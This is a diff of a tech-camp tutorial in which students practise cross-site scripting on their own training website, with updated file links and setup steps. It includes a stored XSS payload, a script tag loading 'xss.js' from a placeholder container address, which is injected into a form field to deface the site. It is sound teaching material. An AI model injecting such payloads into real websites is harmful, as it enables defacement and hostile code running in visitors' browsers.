@@ -32,14 +32,15 @@ At best, a cross site scripting threat will simply deface your website. You see 
 
 If you are setting up this project from the Database session, all of the files you will need are located in the following folder in this git repo:
 
-[Github Security Files Repository](https://github.com/RRC-ACE-Outreach/TechCamp/tree/main/TechCamp%20-%20Web%20App/0%20-%20Starting%20and%20Ending%20Files/04%20Security%20Starting%20Files)
+[Github Security Files Repository](https://github.com/RRC-ACE-Outreach/TechCamp/tree/main/TechCamp%20-%20Web%20App/0%20-%20Starting%20and%20Ending%20Files/02%20Database%20Ending%20Files)
 -->
 
 If you wish to start with the project already set up, you can get them from the following directory:
-[0 - Starting and Ending Files/04 Security Ending Files/Before Intrusion](0%20-%20Starting%20and%20Ending%20Files/04%20Security%20Ending%20Files/Before%20Intrusion)
+[Starting and Ending Files/04 Security Ending Files/Before Intrusion](0%20-%20Starting%20and%20Ending%20Files/04%20Security%20Ending%20Files/Before%20Intrusion)
 
-### NOTE from Andrea: will still need to give instruction on how to get the files into their project.
-In the Starting Files folder are several files that you need to copy over to your project first. These files are:
+In the Starting Files folder are several files that you need to copy over to your project first. The following files will add login and logout functionality, as well as manage your session, so you can stay logged in until you logout.
+
+We can do this by creating the file by the listed name below, opening it in the goormIDE editor, and copy/pasting the code from the following files into the goormIDE.  These files are:
 1. [login.inc](https://raw.githubusercontent.com/RRC-ACE-Outreach/TechCamp/main/TechCamp%20-%20Web%20App/0%20-%20Starting%20and%20Ending%20Files/04%20Security%20Starting%20Files/login.inc)
 1. [login_state.inc](https://raw.githubusercontent.com/RRC-ACE-Outreach/TechCamp/main/TechCamp%20-%20Web%20App/0%20-%20Starting%20and%20Ending%20Files/04%20Security%20Starting%20Files/login_state.inc)
 1. [logout.php](https://raw.githubusercontent.com/RRC-ACE-Outreach/TechCamp/main/TechCamp%20-%20Web%20App/0%20-%20Starting%20and%20Ending%20Files/04%20Security%20Starting%20Files/logout.php)
@@ -193,16 +194,13 @@ It doesn’t matter what you put in to the password field, so long as the name f
 
 When you have logged in using your “account”, it’s time to save some code to the website so that it can take over!
 
-# NOTE from Andrea: the below URL will need Goorm specific instructions.
 #### Hacking Code 2
-Before we can the next piece of hacking code, we need to change something. The part of the text that says `#.#.#.#` is the name of the computer you wish to load your `xss.js` from. You will need to replace the `#.#.#.#` with the text “localhost”. This will load `xss.js` from your computer if you have set it up.
+Before we can the next piece of hacking code, we need to change something. The part of the text that says `<YOUR_CONTAINER_ADDRESS>` is the name of the computer you wish to load your `xss.js` from. You will need to replace the `<YOUR_CONTAINER_ADDRESS>` with the text you see when you look at your website. This will load `xss.js` from your server if/when you have set it up.
 ```
-<script language=javascript src=http://#.#.#.#/xss.js></script>
+<script language=javascript src=http://<YOUR_CONTAINER_ADDRESS>/xss.js></script>
 ```  
 Once that is done, enter the altered text in to the first field on the Index, and enter other information as you require for the other fields. When you are done, it should look like this:
-```
-{Replace this with the example of code needed}
-```
+<img src="0 - Images/04 security xss injection.PNG" alt="4th edit to add login functionality">
 
 Click create, and suddenly the website has been defaced by Hackit the Cat!
 
